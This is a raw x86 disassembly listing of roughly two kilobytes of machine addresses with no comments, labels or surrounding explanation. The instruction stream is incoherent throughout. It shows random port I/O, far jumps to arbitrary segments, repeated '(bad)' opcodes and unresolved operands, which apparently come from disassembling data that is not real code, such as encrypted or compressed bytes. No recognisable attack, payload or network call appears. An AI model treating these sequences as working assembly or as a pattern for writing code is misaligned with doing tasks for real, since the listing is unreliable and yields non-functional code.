  41e3d8:	pop    ss
  41e3d9:	jecxz  0x41e42c
  41e3db:	pop    es
  41e3dc:	xchg   DWORD PTR [ecx-0x40],esp
  41e3df:	arpl   WORD PTR [ecx+edi*1+0x45],di
  41e3e3:	sub    BYTE PTR [edx-0x43],ch
  41e3e6:	xchg   DWORD PTR [edi+0x23bdb89],ebp
  41e3ec:	fnstenv [esi+eax*8]
  41e3ef:	cmp    BYTE PTR [esi-0x5cc8393f],ch
  41e3f5:	xchg   DWORD PTR [ebp-0x5f],ecx
  41e3f8:	push   edx
  41e3f9:	pop    ecx
  41e3fa:	jno    0x41e3e6
  41e3fc:	(bad)  
  41e3fd:	int3   
  41e3fe:	lea    eax,ds:0x640e9ad7
  41e404:	mov    esp,DWORD PTR ds:0x50c2b2bc
  41e40a:	lds    ebx,FWORD PTR [ebx-0x4f]
  41e40d:	outs   dx,BYTE PTR ds:[esi]
  41e40e:	ud1    ebx,ebx
  41e411:	js     0x41e397
  41e413:	pop    edx
  41e414:	ja     0x41e491
  41e416:	sub    DWORD PTR [edi],eax
  41e418:	call   0x47466c9c
  41e41d:	dec    esi
  41e41e:	into   
  41e41f:	sahf   
  41e420:	out    0x5c,al
  41e422:	int3   
  41e423:	or     ebx,DWORD PTR [ecx+0x5f]
  41e426:	sbb    al,0x4f
  41e428:	mov    ds:0xe723de50,eax
  41e42d:	stos   DWORD PTR es:[edi],eax
  41e42e:	ror    edi,0x41
  41e431:	mov    ebx,0x74e74960
  41e436:	loopne 0x41e4b7
  41e438:	out    0x3,al
  41e43a:	ficomp DWORD PTR [ebx+edx*2]
  41e43d:	sub    al,0xa7
  41e43f:	mov    bh,0x14
  41e441:	sbb    BYTE PTR [ebp+0x6a],ah
  41e444:	test   eax,0x8fb768d8
  41e449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e44a:	jae    0x41e4b2
  41e44c:	adc    eax,0x58155015
  41e451:	cld    
  41e452:	add    DWORD PTR [edi],ebx
  41e454:	inc    esi
  41e455:	aad    0xcf
  41e457:	pop    eax
  41e458:	fs ins DWORD PTR es:[edi],dx
  41e45a:	or     DWORD PTR [ebx],ebx
  41e45c:	lea    esp,[ebp+0x68fe7e8c]
  41e462:	in     al,0xb9
  41e464:	(bad)  
  41e466:	push   ecx
  41e467:	adc    eax,DWORD PTR [esi+0x17d207c3]
  41e46d:	outs   dx,DWORD PTR ds:[esi]
  41e46e:	lahf   
  41e46f:	pop    eax
  41e470:	push   eax
  41e471:	pop    ds
  41e472:	fwait
  41e473:	adc    BYTE PTR [ecx],bh
  41e475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e476:	mov    bh,0x90
  41e478:	jle    0x41e438
  41e47a:	pop    ds
  41e47b:	cmc    
  41e47c:	mov    dl,0x66
  41e47e:	jg     0x41e49b
  41e480:	inc    ebp
  41e481:	mov    al,ds:0x6d2c0c76
  41e486:	xchg   esi,eax
  41e487:	jne    0x41e4a7
  41e489:	mov    al,ds:0x29a22045
  41e48e:	out    0xfa,eax
  41e490:	mov    bl,0x7f
  41e492:	nop
  41e493:	or     al,0xe6
  41e495:	inc    ebp
  41e496:	out    dx,al
  41e497:	inc    eax
  41e498:	fcmovnu st,st(7)
  41e49a:	or     BYTE PTR [esi],cl
  41e49c:	pop    edx
  41e49d:	inc    eax
  41e49e:	and    ebp,ebx
  41e4a0:	fst    DWORD PTR [edx-0xe4b69c3]
  41e4a6:	add    BYTE PTR [edx],dh
  41e4a8:	sahf   
  41e4a9:	adc    ah,BYTE PTR [ebx+0x27]
  41e4ac:	mov    ebx,0x360e6e62
  41e4b1:	xchg   ebx,eax
  41e4b2:	or     esi,ebx
  41e4b4:	or     dl,BYTE PTR [edx-0x3bb7b6c4]
  41e4ba:	jle    0x41e4b4
  41e4bc:	push   ecx
  41e4bd:	jg     0x41e453
  41e4bf:	popa   
  41e4c0:	adc    al,0x12
  41e4c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4c3:	ds enter 0x47e0,0x89
  41e4c8:	push   0x6cf3501a
  41e4cd:	xchg   ebp,eax
  41e4ce:	div    BYTE PTR [ebx+0x6637bf66]
  41e4d4:	and    eax,0xd423cdfe
  41e4d9:	cld    
  41e4da:	inc    esp
  41e4db:	push   DWORD PTR [ebp+0x25]
  41e4de:	sar    DWORD PTR [ebp+0x36],0x36
  41e4e2:	in     eax,dx
  41e4e3:	retf   0x8006
  41e4e6:	add    al,0x0
  41e4e8:	sbb    eax,0x180633da
  41e4ed:	shl    ch,0x7e
  41e4f0:	xchg   edx,eax
  41e4f1:	outs   dx,DWORD PTR ds:[esi]
  41e4f2:	imul   ebp,DWORD PTR [eax],0xb5a42dc
  41e4f8:	into   
  41e4f9:	packssdw mm1,QWORD PTR ds:0xa7d38979
  41e500:	add    DWORD PTR [esi+edx*2-0x7ecfe0b0],esp
  41e507:	(bad)  
  41e508:	mov    al,ds:0x75a9651e
  41e50d:	jnp    0x41e56e
  41e50f:	sbb    bl,BYTE PTR [ecx]
  41e511:	dec    eax
  41e512:	cmc    
  41e513:	push   eax
  41e514:	xlat   BYTE PTR fs:[ebx]
  41e516:	jns    0x41e4a0
  41e518:	adc    al,0xb5
  41e51a:	retf   
  41e51b:	rcl    al,cl
  41e51d:	mov    di,0xd72f
  41e521:	dec    ecx
  41e522:	in     eax,dx
  41e523:	fisttp QWORD PTR [edi-0x3495f973]
  41e529:	jnp    0x41e586
  41e52b:	add    DWORD PTR [ecx-0x67a0fa0],esp
  41e531:	inc    edx
  41e532:	(bad)  [esi-0x4b]
  41e535:	jae    0x41e52d
  41e537:	push   esp
  41e538:	sub    ch,bh
  41e53a:	scas   eax,DWORD PTR es:[edi]
  41e53b:	xchg   edx,eax
  41e53c:	cli    
  41e53d:	sti    
  41e53e:	enter  0x15d9,0xca
  41e542:	dec    ebp
  41e543:	imul   edx,DWORD PTR [eax+0x24],0xffffffb7
  41e547:	push   edi
  41e548:	arpl   WORD PTR [edx+0x7c],sp
  41e54b:	in     eax,dx
  41e54c:	pop    esp
  41e54d:	mov    cl,BYTE PTR [ebx-0x65]
  41e550:	jb     0x41e540
  41e552:	push   ebp
  41e553:	mov    ecx,0x580bbaa2
  41e558:	fs push eax
  41e55a:	ja     0x41e573
  41e55c:	fistp  WORD PTR [edx-0x34]
  41e55f:	jge    0x41e576
  41e561:	cs ret 0xf032
  41e565:	sub    DWORD PTR [edx+esi*2-0x61],0xba43741
  41e56d:	xor    esp,DWORD PTR [ebp+0x26]
  41e570:	sub    al,0xbf
  41e572:	ins    DWORD PTR es:[edi],dx
  41e573:	mov    eax,ds:0x9483ded8
  41e578:	cwde   
  41e579:	xor    al,0xbf
  41e57b:	add    eax,0x850ac446
  41e580:	fsubr  DWORD PTR [edx-0x74]
  41e583:	ror    DWORD PTR [ebx-0x91ebddf],1
  41e589:	and    al,0xfc
  41e58b:	or     al,BYTE PTR [ebp-0x2571032a]
  41e591:	daa    
  41e592:	and    DWORD PTR [ecx],0x26c04933
  41e598:	iret   
  41e599:	icebp  
  41e59a:	in     al,0xc0
  41e59c:	stos   BYTE PTR es:[edi],al
  41e59d:	adc    al,0x8e
  41e59f:	push   es
  41e5a0:	sti    
  41e5a1:	repz into 
  41e5a3:	adc    eax,0xc4ef1ce7
  41e5a8:	mov    al,ds:0xdbfafad1
  41e5ad:	test   eax,0x6b7cd6d8
  41e5b2:	or     esi,DWORD PTR [edx+0x67]
  41e5b5:	mov    eax,ds:0x42a29385
  41e5ba:	or     bl,dl
  41e5bc:	retf   0x84a2
  41e5bf:	(bad)
  41e5c3:	stos   BYTE PTR es:[di],al
  41e5c5:	fild   WORD PTR [edi]
  41e5c7:	in     al,0x58
  41e5c9:	inc    esi
  41e5ca:	push   cs
  41e5cb:	mov    ?,WORD PTR [ebx-0x40]
  41e5ce:	mov    eax,0xb3d48122
  41e5d3:	in     eax,0xf1
  41e5d5:	xchg   ecx,eax
  41e5d6:	mov    esp,0xc7944ccf
  41e5db:	cwde   
  41e5dc:	push   eax
  41e5dd:	push   esp
  41e5de:	pop    es
  41e5df:	jb     0x41e5e8
  41e5e1:	fistp  WORD PTR [edi-0x58]
  41e5e4:	enter  0xd5e6,0x1
  41e5e8:	sbb    DWORD PTR [ebx-0x3dfcb990],esp
  41e5ee:	repnz and bh,bh
  41e5f1:	das    
  41e5f2:	repz fiadd DWORD PTR [edi+ebx*1]
  41e5f6:	jp     0x41e58a
  41e5f8:	inc    ebp
  41e5f9:	pop    ss
  41e5fa:	mov    edi,0xa6b3b030
  41e5ff:	lds    eax,FWORD PTR [ebx-0x297206e5]
  41e605:	mov    ds:0xfbe2e601,eax
  41e60a:	adc    DWORD PTR ds:0x1b0db258,0xffffffe4
  41e611:	aas    
  41e612:	mov    ch,0x1c
  41e615:	test   BYTE PTR [edx+0x1cba3f7f],al
  41e61b:	push   edx
  41e61c:	clc    
  41e61d:	outs   dx,DWORD PTR ds:[esi]
  41e61e:	aas    
  41e61f:	addr16 (bad) 
  41e621:	cmp    al,BYTE PTR ds:0xbfd491d0
  41e627:	jno    0x41e67a
  41e629:	push   esi
  41e62a:	mov    DWORD PTR [ebp-0x142052d7],edx
  41e630:	out    0x85,al
  41e632:	std    
  41e633:	mov    eax,ds:0x30d38904
  41e638:	sbb    eax,0xa02d0537
  41e63d:	inc    ebx
  41e63e:	pop    ebx
  41e63f:	aad    0xa1
  41e641:	aam    0xb7
  41e643:	retf   
  41e644:	cs mov bl,0xe7
  41e647:	inc    eax
  41e648:	mov    fs,WORD PTR ds:0x42974654
  41e64e:	xchg   edi,eax
  41e64f:	sbb    ebx,DWORD PTR [edi+0x1ae014e1]
  41e655:	sbb    BYTE PTR [edi+esi*2+0x30],0x0
  41e65a:	int    0xc2
  41e65c:	fisubr WORD PTR [edi+0x60745e14]
  41e662:	sbb    esi,DWORD PTR [eax]
  41e664:	cmp    bl,ah
  41e666:	les    edi,FWORD PTR [ebp-0x779759e2]
  41e66c:	sbb    BYTE PTR [eax],ah
  41e66e:	enter  0x52cb,0xf6
  41e672:	or     edi,DWORD PTR [esi+0x7d]
  41e675:	cmp    BYTE PTR [edx+0x27],ch
  41e678:	jg     0x41e608
  41e67a:	or     BYTE PTR [edx],dl
  41e67c:	callw  0x7d76
  41e680:	loopne 0x41e69e
  41e682:	test   eax,0xb96a555a
  41e687:	fs stos DWORD PTR es:[edi],eax
  41e689:	jp     0x41e696
  41e68b:	and    bl,BYTE PTR fs:[ecx+0x1ca6e37c]
  41e692:	out    0xcc,eax
  41e694:	xchg   ebx,eax
  41e695:	push   0x29
  41e697:	cdq    
  41e698:	test   al,0x1d
  41e69a:	gs add ecx,esp
  41e69d:	inc    ebp
  41e69e:	sbb    al,0x88
  41e6a0:	jle    0x41e70d
  41e6a2:	adc    eax,0xcd87d87c
  41e6a7:	sub    al,0xf8
  41e6a9:	push   cs
  41e6aa:	out    0x3b,al
  41e6ac:	leave  
  41e6ad:	jge    0x41e6ba
  41e6af:	push   0xffffff94
  41e6b1:	icebp  
  41e6b2:	repz shr DWORD PTR [ecx+0x7c10be3a],0xf9
  41e6ba:	xchg   esi,eax
  41e6bb:	iret   
  41e6bc:	add    al,0xe2
  41e6be:	(bad)  
  41e6bf:	sub    ebp,DWORD PTR [esi]
  41e6c1:	imul   esp,DWORD PTR [ecx+0x5c],0x55
  41e6c5:	jae    0x41e727
  41e6c7:	cmp    BYTE PTR [ebx],bh
  41e6c9:	cmp    eax,eax
  41e6cb:	pop    es
  41e6cc:	push   ebx
  41e6cd:	cwde   
  41e6ce:	sub    BYTE PTR [edi],bh
  41e6d0:	fdivr  QWORD PTR [edx-0x7aae04ff]
  41e6d6:	jae    0x41e73b
  41e6d8:	int    0x62
  41e6da:	sbb    BYTE PTR [ecx+0x34],cl
  41e6dd:	fwait
  41e6de:	push   esi
  41e6df:	aad    0x6c
  41e6e1:	fldcw  WORD PTR [ebx-0x230b4fb]
  41e6e7:	fs js  0x41e769
  41e6ea:	xchg   edi,eax
  41e6eb:	xor    DWORD PTR [ebp-0x26],0x29
  41e6ef:	push   ss
  41e6f0:	xor    bh,ah
  41e6f2:	fcom   QWORD PTR [ebx+0x3c]
  41e6f5:	stos   DWORD PTR es:[edi],eax
  41e6f6:	lahf   
  41e6f7:	sbb    al,0xc4
  41e6f9:	mov    ebx,0x601a1e66
  41e6fe:	dec    ecx
  41e6ff:	and    al,0xa4
  41e702:	xchg   esi,eax
  41e703:	cmc    
  41e704:	push   eax
  41e705:	into   
  41e706:	(bad)  
  41e707:	jnp    0x41e69b
  41e709:	pop    ecx
  41e70a:	popf   
  41e70b:	mov    BYTE PTR [edx+0x53],ch
  41e70e:	and    cl,BYTE PTR [edx-0x7c]
  41e711:	lods   al,BYTE PTR ds:[esi]
  41e712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e714:	add    DWORD PTR [eax+esi*8-0x61abdec3],eax
  41e71b:	pop    es
  41e71c:	and    al,0x64
  41e71e:	and    esp,DWORD PTR [edi+0xa]
  41e721:	pushf  
  41e722:	jae    0x41e6bf
  41e724:	call   0x18db:0xabe111a4
  41e72b:	jno    0x41e6ea
  41e72d:	jmp    DWORD PTR [ecx+edi*8]
  41e730:	outs   dx,BYTE PTR ds:[esi]
  41e731:	sub    edx,DWORD PTR [edx+0x5bc8b977]
  41e737:	pop    es
  41e738:	stos   BYTE PTR es:[edi],al
  41e739:	jg     0x41e726
  41e73b:	xlat   BYTE PTR ds:[ebx]
  41e73c:	push   ebp
  41e73d:	mov    ecx,0x9ede6b88
  41e742:	popa   
  41e743:	mov    ebx,0x5655b820
  41e748:	mov    DWORD PTR [ecx],0xf4148991
  41e74e:	cmc    
  41e74f:	fidivr DWORD PTR [edx-0x7462342b]
  41e755:	push   ebx
  41e756:	sti    
  41e757:	pop    eax
  41e758:	sub    eax,DWORD PTR [edx-0x4be9ba8e]
  41e75e:	xor    DWORD PTR [edx],eax
  41e760:	pop    esp
  41e761:	xor    eax,0x8c05170d
  41e766:	push   edx
  41e767:	mov    ebp,DWORD PTR [edi-0x50632dc4]
  41e76d:	sbb    DWORD PTR [ebx-0x1b],ebx
  41e770:	retf   
  41e771:	inc    eax
  41e772:	into   
  41e773:	repnz push esi
  41e775:	loop   0x41e756
  41e777:	clc    
  41e778:	jns    0x41e799
  41e77a:	push   ss
  41e77b:	lahf   
  41e77c:	mov    bl,0x7b
  41e77e:	jmp    0x2823:0x51ef55ed
  41e785:	out    dx,eax
  41e786:	dec    esi
  41e787:	cmc    
  41e788:	outs   dx,DWORD PTR ds:[esi]
  41e789:	loop   0x41e7fb
  41e78b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e78c:	in     al,0x35
  41e78e:	test   eax,0x94075fc3
  41e793:	mov    ecx,0x1892ef54
  41e798:	mov    ecx,0xb5cb71a7
  41e79d:	and    BYTE PTR [esi-0x62],dh
  41e7a0:	aam    0x6b
  41e7a2:	jae    0x41e75f
  41e7a4:	test   cl,ah
  41e7a6:	mov    ah,0x84
  41e7a8:	lds    eax,FWORD PTR [edi]
  41e7aa:	pop    ebp
  41e7ab:	and    BYTE PTR fs:[esi+0x74],bh
  41e7af:	retf   
  41e7b0:	mov    al,ds:0x7e19d5f8
  41e7b5:	imul   ecx,DWORD PTR [esi],0x79
  41e7b8:	inc    ebx
  41e7b9:	mov    ch,0x2e
  41e7bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7bc:	dec    eax
  41e7bd:	cdq    
  41e7be:	jnp    0x41e835
  41e7c0:	ds push 0x15d57ebc
  41e7c6:	sbb    bl,BYTE PTR [ebx]
  41e7c8:	push   ss
  41e7c9:	adc    DWORD PTR [esi+0x56495893],esp
  41e7cf:	(bad)  
  41e7d0:	cmp    eax,0xe7fe722
  41e7d5:	and    BYTE PTR [edx],ah
  41e7d7:	out    dx,al
  41e7d8:	xchg   edi,eax
  41e7d9:	mov    bl,0xb2
  41e7db:	fidivr DWORD PTR [edi-0x46]
  41e7de:	push   ds
  41e7df:	mov    esi,0x47630e2a
  41e7e4:	add    al,0x93
  41e7e6:	mov    ch,0x86
  41e7e8:	cli    
  41e7e9:	repnz aam 0x2d
  41e7ec:	pushf  
  41e7ed:	cmp    DWORD PTR [eax-0x5c],esp
  41e7f0:	das    
  41e7f1:	dec    edi
  41e7f2:	sbb    cl,al
  41e7f4:	cmp    al,BYTE PTR [ecx]
  41e7f6:	test   al,0x9b
  41e7f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7f9:	shl    BYTE PTR [ecx+ecx*4],1
  41e7fc:	(bad)  
  41e7fd:	(bad)  
  41e7fe:	shl    ecx,cl
  41e800:	sbb    cl,BYTE PTR [edi]
  41e802:	icebp  
  41e803:	xchg   ebp,eax
  41e804:	inc    edx
  41e805:	sbb    eax,0x4605b3ba
  41e80a:	mov    BYTE PTR [ebx+0x1398c1d7],dh
  41e810:	in     al,dx
  41e811:	sti    
  41e812:	xchg   DWORD PTR [ecx],esi
  41e814:	sbb    ecx,esi
  41e816:	push   dx
  41e818:	or     ebx,esp
  41e81a:	mov    edi,0xc9b8f16
  41e81f:	stc    
  41e820:	test   DWORD PTR [ecx-0x6013d6ff],0x97611a00
  41e82a:	mov    ah,BYTE PTR [ecx-0x79]
  41e82d:	mov    edi,ebp
  41e82f:	fwait
  41e830:	push   cs
  41e831:	and    al,0xf6
  41e834:	in     al,0x55
  41e836:	add    eax,0x1397d02a
  41e83b:	dec    edx
  41e83c:	jmp    0xc454af1c
  41e841:	loopne 0x41e7ec
  41e843:	mov    ?,WORD PTR [esi+0x77]
  41e846:	(bad)  
  41e847:	shr    bh,1
  41e849:	push   esp
  41e84a:	mov    ds:0x92c7239a,eax
  41e84f:	dec    esi
  41e850:	xchg   esi,eax
  41e851:	inc    esi
  41e852:	xor    BYTE PTR [edi+0x5b],dl
  41e855:	(bad)  [ebp-0x25e84698]
  41e85b:	shl    ch,cl
  41e85d:	loope  0x41e7f3
  41e85f:	test   BYTE PTR [edx+0x2d2e69d0],cl
  41e865:	sti    
  41e866:	fcmovnb st,st(7)
  41e868:	push   ss
  41e869:	leave  
  41e86a:	stos   BYTE PTR es:[edi],al
  41e86b:	sub    eax,0xae51d7d4
  41e870:	ret    
  41e871:	adc    bl,BYTE PTR [ebp+eax*1+0x53]
  41e875:	ds push ss
  41e877:	aam    0xeb
  41e879:	jo     0x41e89f
  41e87b:	xor    DWORD PTR ds:0x842f156c,edx
  41e881:	shr    ebp,cl
  41e883:	int    0xdb
  41e885:	out    0x4f,al
  41e887:	cmp    BYTE PTR [edi+ebp*4-0x68f37525],ch
  41e88e:	sar    BYTE PTR [ebx-0x65],cl
  41e891:	dec    eax
  41e892:	ins    DWORD PTR es:[edi],dx
  41e893:	(bad)  
  41e894:	jbe    0x41e902
  41e896:	arpl   WORD PTR [ebx-0x2b1253ec],sp
  41e89c:	sar    DWORD PTR [eax],cl
  41e89e:	(bad)  
  41e89f:	div    DWORD PTR [ebp-0x58db80da]
  41e8a5:	mov    edx,edx
  41e8a7:	sbb    esp,DWORD PTR [ecx]
  41e8a9:	mov    ds:0x43d11e11,al
  41e8ae:	push   esi
  41e8af:	mov    bh,0xae
  41e8b1:	mov    eax,ds:0x47e934eb
  41e8b6:	pop    ss
  41e8b7:	daa    
  41e8b8:	cmp    BYTE PTR [edi-0x50],al
  41e8bb:	jp     0x41e853
  41e8bd:	int    0xf
  41e8bf:	cdq    
  41e8c0:	push   ebx
  41e8c1:	ja     0x41e872
  41e8c3:	mov    BYTE PTR [eax],bl
  41e8c5:	cld    
  41e8c6:	jp     0x41e8bf
  41e8c8:	fs das 
  41e8ca:	cmc    
  41e8cb:	mov    esi,DWORD PTR [eax-0x61b89b4d]
  41e8d1:	js     0x41e909
  41e8d3:	ins    DWORD PTR es:[edi],dx
  41e8d4:	mov    ds:0x4ad7ee7,eax
  41e8d9:	and    BYTE PTR [eax-0x78],bl
  41e8dc:	or     BYTE PTR [ebx+0x3ff900be],bh
  41e8e2:	cwde   
  41e8e3:	mov    bh,0xe8
  41e8e5:	push   cs
  41e8e6:	int3   
  41e8e7:	mul    BYTE PTR [edx-0x10]
  41e8ea:	inc    esi
  41e8eb:	scas   al,BYTE PTR es:[edi]
  41e8ec:	imul   DWORD PTR [esi]
  41e8ee:	pop    ss
  41e8ef:	jmp    0xf40c9e39
  41e8f4:	xor    DWORD PTR [edi],edx
  41e8f6:	jmp    0x57bc:0x86d6b178
  41e8fd:	mov    esp,0x462b45cb
  41e902:	fistp  QWORD PTR [ecx-0x64]
  41e905:	pushf  
  41e906:	outs   dx,BYTE PTR ds:[esi]
  41e907:	cmc    
  41e908:	and    DWORD PTR [esi+0x58],esi
  41e90b:	cld    
  41e90c:	sub    esp,DWORD PTR [ebp+0x3f]
  41e90f:	jnp    0x41e8eb
  41e911:	xor    eax,0xe6fbc6f6
  41e916:	enter  0xf3f7,0x29
  41e91a:	mul    BYTE PTR [edx-0x1a8c19cd]
  41e920:	popf   
  41e921:	jne    0x41e959
  41e923:	clc    
  41e924:	jns    0x41e913
  41e926:	pop    es
  41e927:	call   0xd826:0x6770e726
  41e92e:	into   
  41e92f:	loope  0x41e94c
  41e931:	inc    esi
  41e932:	inc    ebx
  41e933:	dec    eax
  41e934:	dec    edx
  41e935:	adc    eax,0x43eade3a
  41e93a:	and    al,0x5d
  41e93c:	lds    ebp,FWORD PTR [esi]
  41e93e:	xchg   esi,eax
  41e93f:	add    edi,DWORD PTR [esp+ebp*1-0x6a181e37]
  41e946:	sbb    BYTE PTR [edx+0x6c],bl
  41e949:	jbe    0x41e9c5
  41e94b:	imul   esp,DWORD PTR [ecx+0x7288efc5],0x75
  41e952:	fsub   QWORD PTR [ebp-0x7d]
  41e955:	mov    edx,0xf73737da
  41e95a:	loope  0x41e923
  41e95c:	dec    edi
  41e95d:	fnsave [ecx]
  41e95f:	xor    ecx,edx
  41e961:	dec    edx
  41e962:	add    ebp,esp
  41e964:	fcom   DWORD PTR [eax+0x700dc1ad]
  41e96a:	cmp    dl,BYTE PTR [ebx-0x4e9db6ac]
  41e970:	or     BYTE PTR [ebp+0x24],ch
  41e973:	call   0x8d9a2682
  41e978:	adc    al,0xe5
  41e97a:	sub    dh,BYTE PTR [esi-0x1c4cdedb]
  41e980:	jnp    0x41e949
  41e982:	xchg   edx,eax
  41e983:	ds pop ds
  41e985:	lahf   
  41e986:	adc    DWORD PTR [edx+0x2a],esp
  41e989:	adc    DWORD PTR [esi],ebx
  41e98b:	sbb    ebx,DWORD PTR [eax+edi*8+0xf2ba1bc]
  41e992:	test   eax,0x91cfc577
  41e997:	xchg   edx,eax
  41e998:	pop    edx
  41e999:	iret   
  41e99a:	jmp    0x7eaf81ae
  41e99f:	jo     0x41e998
  41e9a1:	adc    DWORD PTR [ebx-0x17],0x30
  41e9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9a6:	mov    ecx,0xdefa73f9
  41e9ab:	enter  0x1e61,0xac
  41e9af:	mov    dl,0xab
  41e9b1:	mov    WORD PTR [esi+0xc],ds
  41e9b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9b5:	xchg   ecx,eax
  41e9b6:	inc    esp
  41e9b7:	adc    ah,BYTE PTR [esi]
  41e9b9:	dec    ebx
  41e9ba:	and    DWORD PTR [ebx],esp
  41e9bc:	shr    BYTE PTR [ecx+0x2ef8d0f],cl
  41e9c2:	aam    0x6
  41e9c4:	stc    
  41e9c5:	pop    edx
  41e9c6:	push   ss
  41e9c7:	lds    eax,FWORD PTR [ecx]
  41e9c9:	icebp  
  41e9ca:	out    0x87,al
  41e9cc:	or     al,0x52
  41e9ce:	loopne 0x41e977
  41e9d0:	test   DWORD PTR [ebp-0x4],ebp
  41e9d3:	cmp    DWORD PTR [eax],ebx
  41e9d5:	push   esi
  41e9d6:	cmp    DWORD PTR [esi+0x7d4454c4],eax
  41e9dc:	pusha  
  41e9dd:	gs push 0x15
  41e9e0:	rcr    BYTE PTR [esi],1
  41e9e2:	add    al,0xc9
  41e9e4:	enter  0x598e,0x23
  41e9e8:	arpl   WORD PTR ss:[ebp+0x4d],sp
  41e9ec:	push   edx
  41e9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9ee:	dec    esi
  41e9ef:	pop    edx
  41e9f0:	add    DWORD PTR [edx+0x55b65cec],edx
  41e9f6:	dec    edx
  41e9f7:	or     edi,DWORD PTR [ecx-0x28]
  41e9fa:	xchg   edx,eax
  41e9fb:	xchg   ebp,eax
  41e9fc:	std    
  41e9fd:	pusha  
  41e9fe:	adc    esp,DWORD PTR [esi]
  41ea00:	lods   al,BYTE PTR ds:[esi]
  41ea01:	adc    edx,DWORD PTR [ebx]
  41ea03:	fidiv  DWORD PTR [eax+ebx*2+0x13]
  41ea07:	mov    eax,0xb88abc6f
  41ea0c:	mov    al,0xfb
  41ea0e:	ins    BYTE PTR es:[edi],dx
  41ea0f:	xor    BYTE PTR [eax-0x316eba5a],0x3b
  41ea16:	sti    
  41ea17:	jbe    0x41e9a1
  41ea19:	mov    al,ds:0x2dfc0157
  41ea1e:	and    edx,DWORD PTR [ebp+ecx*2-0x6535a486]
  41ea25:	lods   al,BYTE PTR ds:[esi]
  41ea26:	stos   DWORD PTR es:[edi],eax
  41ea27:	stc    
  41ea28:	add    BYTE PTR [ebp+0x18],dh
  41ea2b:	mov    al,ds:0x4ff30ee3
  41ea30:	fwait
  41ea31:	and    al,0x82
  41ea33:	push   esi
  41ea34:	idiv   BYTE PTR [esi]
  41ea36:	sbb    ebp,esi
  41ea38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea39:	retf   0xcd97
  41ea3c:	or     BYTE PTR [ecx+0x7906b8a4],bl
  41ea42:	cld    
  41ea43:	je     0x41ea29
  41ea45:	fild   DWORD PTR [esi+0x5c]
  41ea48:	xchg   BYTE PTR [edx-0x75aae22c],ch
  41ea4e:	je     0x41ea9b
  41ea50:	mov    esp,0xf84c6bca
  41ea55:	cli    
  41ea56:	into   
  41ea57:	pop    edi
  41ea58:	inc    esi
  41ea59:	gs ret 0x8c9b
  41ea5d:	push   eax
  41ea5e:	(bad)  [ebx-0x71]
  41ea61:	xchg   esi,eax
  41ea62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea63:	loope  0x41ea1c
  41ea65:	dec    ecx
  41ea66:	pusha  
  41ea67:	sbb    BYTE PTR [edx],al
  41ea69:	dec    edi
  41ea6a:	loopne 0x41eabf
  41ea6c:	xor    eax,DWORD PTR [ebx+0x2471f003]
  41ea72:	push   cs
  41ea73:	test   DWORD PTR [ebp-0x34],edi
  41ea76:	ror    BYTE PTR [edi+0x3bca93b],1
  41ea7c:	push   edx
  41ea7d:	in     eax,0x25
  41ea7f:	mov    cl,0x33
  41ea81:	sahf   
  41ea82:	cmp    BYTE PTR [edx-0x186fb5cf],cl
  41ea88:	adc    bl,bl
  41ea8a:	test   DWORD PTR [ecx+0x1d],0x23dfcf8b
  41ea91:	popa   
  41ea92:	pusha  
  41ea93:	(bad)  
  41ea94:	clc    
  41ea95:	out    dx,eax
  41ea96:	(bad)  
  41ea97:	adc    bl,BYTE PTR ds:0x2deb576f
  41ea9d:	sbb    eax,0xebadde6c
  41eaa2:	xor    esp,DWORD PTR [ebx+0x36893574]
  41eaa8:	mov    ebx,0xfed7e9a
  41eaad:	clc    
  41eaae:	jl     0x41eaf6
  41eab0:	jns    0x41eada
  41eab2:	pusha  
  41eab3:	cmp    ebp,esp
  41eab5:	sub    ch,bh
  41eab7:	jge    0x41eb29
  41eab9:	leave  
  41eaba:	bnd jl 0x41eb11
  41eabd:	scas   eax,DWORD PTR es:[edi]
  41eabe:	mov    cl,BYTE PTR ds:0xa722328
  41eac4:	pop    edx
  41eac5:	jle    0x41ea8b
  41eac7:	div    DWORD PTR [edi-0x69]
  41eaca:	(bad)  [eax+ecx*8-0x3165b608]
  41ead1:	ret    
  41ead2:	cld    
  41ead3:	mov    ebx,0x2dc45780
  41ead8:	push   0x328b4507
  41eadd:	(bad)  
  41eade:	pop    edx
  41eadf:	test   DWORD PTR [ecx-0x8],ecx
  41eae2:	call   ebx
  41eae4:	les    edx,FWORD PTR [esi+0x602639cd]
  41eaea:	aam    0xb8
  41eaec:	mov    cl,0xc9
  41eaee:	rol    BYTE PTR [ebx+0x36],0xba
  41eaf2:	sti    
  41eaf3:	xchg   esp,eax
  41eaf4:	popf   
  41eaf5:	push   edx
  41eaf6:	add    BYTE PTR [edx+0x1887bd94],dl
  41eafc:	jge    0x41eb07
  41eafe:	pop    ecx
  41eaff:	push   ecx
  41eb00:	sbb    al,0xc0
  41eb02:	and    ch,bh
  41eb04:	data16 jnp 0x41eadb
  41eb07:	pop    ebp
  41eb08:	stos   DWORD PTR es:[edi],eax
  41eb09:	fnstenv [eax+0x7755196c]
  41eb0f:	mov    bh,0x44
  41eb11:	scas   eax,DWORD PTR es:[edi]
  41eb12:	inc    BYTE PTR [edi-0x70]
  41eb15:	xor    ch,BYTE PTR [edx+esi*2-0x41bb93d3]
  41eb1c:	xchg   edx,eax
  41eb1d:	cmp    bl,BYTE PTR [edx-0x78]
  41eb20:	nop
  41eb21:	dec    esi
  41eb22:	inc    esi
  41eb23:	sbb    dh,bh
  41eb25:	push   cs
  41eb26:	in     eax,dx
  41eb27:	cmp    DWORD PTR [ecx+0x41],esp
  41eb2a:	push   edi
  41eb2b:	mov    bl,ah
  41eb2d:	sbb    DWORD PTR [edx],eax
  41eb2f:	and    eax,0x5284a292
  41eb34:	push   es
